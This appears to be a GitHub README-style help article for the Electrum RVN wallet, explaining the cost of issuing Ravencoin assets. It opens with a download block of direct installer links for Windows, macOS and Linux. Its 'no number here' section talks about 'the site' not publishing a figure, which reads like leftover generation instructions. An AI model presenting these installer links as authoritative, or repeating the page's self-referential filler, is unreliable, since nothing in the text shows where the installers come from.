![Electrum RVN](assets/banner-article.png)

# What Does It Cost to Issue a Ravencoin Asset?

<!-- compact-download-block -->

<p align="center">The chain's one-time charge, quoted before you sign</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
Issuing an asset costs a chain-level charge in RVN plus the ordinary network fee for the transaction. Both are paid from the wallet that issues, and the wallet shows the exact amount on the confirmation screen before anything is broadcast. It is a one-time protocol charge, not a subscription, a licence or a payment to the wallet's authors.

## The two components

**The issuance charge.** A one-time charge in RVN, set by the chain's rules rather than by the wallet, when a name is created. It is part of the chain's rules rather than something the wallet decides, and it applies whether you issue a named asset, a sub-asset or a unique one - each creation is its own charge.

**The network fee.** The same fee any transaction pays, for the space it takes in a block. It varies with network conditions, which is why the total is not a single fixed number forever.

Both are shown together on the confirmation screen, and that quoted total is the only figure worth relying on. Anything you read elsewhere - including on this site's own pages - is a snapshot that the chain can outlive.

## Why there is no number here

Because the site asks the question and does not publish an answer: the asset page poses "how much does it cost to issue?" without stating a figure, and no other page supplies one. Rather than invent a plausible-sounding number, this page describes the structure and points at the only place the real number appears - the wallet, at the moment you confirm.

That is not a dodge. A cost quoted from memory is worse than no cost at all: it gets copied, it goes stale, and someone budgets against it.

## How to see the exact cost before you commit

1. Open the asset creation screen in the wallet.
2. Fill in the name, quantity and rules as you intend them.
3. Read the summary screen: it shows the charge and the fee in RVN.
4. If you are not ready, cancel at this point - nothing has been broadcast.

The summary is the last stop before an irreversible action, and it is also where you learn what the action costs. Use it as a quote rather than a formality.

## What the charge is not

**Not a subscription.** There is no renewal, no monthly fee and no per-transfer charge. You pay once per name.

**Not a payment to the developers.** It is a chain-level charge, part of the protocol's rules, not a licence fee or a service bill.

**Not refundable.** A name that is issued stays issued. If you issue, burn everything and change your mind, the name is still claimed and the charge is still spent.

**Not affected by quantity.** Issuing one unit and issuing a million are the same creation, so the charge does not scale with supply.

## Costs that come after issuance

Three, and only the first is unavoidable:

**Transfers.** Every asset transfer pays the ordinary network fee in RVN. Small, and dependent on network conditions rather than on the asset.

**Reissuing**, where the asset allows it, is another creation-like operation and carries its own chain charge plus fee.

**Burning** is a normal transaction and pays the ordinary fee.

None of those are subscriptions either, which is the point of the model: the chain charges for operations, not for time.

## Budgeting without a number

If you need to plan a spend, do it in the wallet rather than in a spreadsheet:

- Fund the wallet with RVN.
- Open the creation screen and read the quoted charge.
- Multiply by the number of names you intend to claim, since each is a separate charge.
- Add a margin for the network fee and for the RVN you will need afterwards to move the asset.

The last line matters. A wallet that spends its RVN down to zero issuing an asset cannot move that asset, because the transfer fee is also paid in RVN. Keep a float.

## Comparing with other models

On contract platforms, creating a token costs a contract deployment plus per-transfer gas, and the cost scales with the complexity of the code. Here the charge is a protocol constant for a name, and transfers cost a normal transaction fee. The structural difference is that nothing needs deploying: the asset layer already exists.

That is also why the wallet needs no second asset to operate. There is no gas token to acquire, no approval transaction and no allowance to manage - [what is a Ravencoin asset?](https://github.com/electrum-source/token-and-network/blob/main/what-is-a-ravencoin-asset-in-electrum-rvn.md) covers the model.

## Before you pay it

Write the seed down first. The charge buys a name at an address derived from your seed, and a lost seed loses the asset the charge paid for - [backing up an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md). Then read the confirmation screen, which is where the real number lives.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. The procedure is [how to issue a Ravencoin asset in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issue-a-ravencoin-asset-in-electrum-rvn.md), the object is [what is a Ravencoin asset?](https://github.com/electrum-source/token-and-network/blob/main/what-is-a-ravencoin-asset-in-electrum-rvn.md), and the version of this page that covers children is [creating Ravencoin sub-assets](https://github.com/electrum-source/token-and-network/blob/main/creating-ravencoin-sub-assets-in-electrum-rvn.md). If an issued asset does not appear afterwards, that is a display problem, not a payment one - [issued asset missing from Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issued-asset-missing-from-electrum-rvn.md). If you are issuing and mining into the same wallet, [mine Ravencoin to an Electrum RVN wallet](https://github.com/electrum-source/token-and-network/blob/main/mine-ravencoin-to-an-electrum-rvn-wallet.md) is the payout side, and the transfer fee question is in [transferring Ravencoin assets](https://github.com/electrum-source/token-and-network/blob/main/transferring-ravencoin-assets-with-electrum-rvn.md). [Ravencoin basics for Electrum RVN users](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-basics-for-electrum-rvn-users.md) is the chain overview if any of the terms here are new.

## FAQ

### How much does it cost to issue an asset?

A protocol-level charge in RVN plus the normal network fee. The wallet shows the exact total before you confirm, and that is the figure to use.

### Why is there no price on this page?

Because the site asks the question without publishing an answer, and a made-up number would be worse than none. The wallet quotes the real cost at confirmation.

### Is the charge per asset or per wallet?

Per name created. Each asset, sub-asset or unique asset is a separate creation.

### Does it cost more to issue a larger supply?

No. The charge is for creating the name, not for the quantity.

### Are there ongoing fees?

No subscription and no renewal. You pay the chain charge once, and ordinary network fees when you move or reissue.

### Can I get the charge back if I change my mind?

No. Issuance is permanent once confirmed, and the charge is spent.

<!-- related-articles -->

## Related articles

- [What Is a Ravencoin Asset?](https://github.com/electrum-source/token-and-network/blob/main/what-is-a-ravencoin-asset-in-electrum-rvn.md)
- [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md)
- [How to Issue a Ravencoin Asset in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issue-a-ravencoin-asset-in-electrum-rvn.md)
- [Creating Ravencoin Sub-Assets in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/creating-ravencoin-sub-assets-in-electrum-rvn.md)
